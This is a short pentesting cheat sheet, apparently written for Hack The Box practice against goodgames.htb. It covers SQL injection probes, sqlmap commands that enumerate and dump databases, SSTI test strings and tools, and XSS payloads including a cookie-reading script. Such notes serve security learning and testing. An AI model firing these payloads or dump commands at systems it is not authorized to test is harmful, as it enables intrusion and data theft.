# SQL 
#sqlmap #sql #sqlinjection 

Some login like:
May be running some SQL query underneath. Try discovering with:

# 1. Capture the request
Open BurpSuite, set it as proxy for your browser (or open their browser) and turn on interception.

Then try some dummy credentials as `ADMIN` and `PASSWORD` and copy paste the POST request in a file. E.g:
```

POST /login HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://goodgames.htb
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://goodgames.htb/signup
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=ADMIN&password=PASSWORD
```
# 2. Test if is SQL-injectable
Try some typical sql-injections and check if the server does respond to any of the queries:
```
# https://github.com/payloadbox/sql-injection-payload-list
'
`
´
ADMIN' OR 1 -- -
' OR 1 -- -

.
.
.

```

# 3. Play with sqlmap
Then open a new terminal and play with sqlmap:
```
cheat sqlmap

sqlmap -r set.req --dbs
sqlmap -r set.req -D databasename --tables
sqlmap -r set.req -D databasename -T tablename --dump

```

# SSTI (Server-Side Template Injection)
#ssti #template-injection
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
One of the most common template engine is Jinja. You can check if there is any template injection vulnerability by introducing some of the classic payloads: 
```
${{<%[%'"}}%\
${7/0}
{{7/0}}
<%= 7/0 %>
```
And check if the server has a different response (e.g.)

Check following tools:

* [TInjA](https://github.com/Hackmanit/TInjA)
```
  TInjA url -u http://example.com -c "session=<coockie>"
```
* [SSTImap](https://github.com/vladko312/sstimap)
* [Tplmap](https://github.com/epinna/tplmap)
* [Template Injection Table](https://github.com/Hackmanit/template-injection-table)

#### Interesting wordlist of variables
#template-injection-wordlist
`SecLists/Fuzzing/template-engines-special-vars.txt`

## Interesting ways of obfuscating revshell

### Linux/Windows
* https://pentestbook.six2dez.com/exploitation/reverse-shells

# Python
Check with Wappalyzer or with any tool or inspection if the server is running python. If so, then search for any user input where the input could be interpreted as python code:

# XSS
https://owasp.org/www-community/attacks/xss/
Test payloads according to [this page](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
```
<script>alert(123)</script>
“><script>alert(document.cookie)</script>
```
Check the link for bypassing methods.
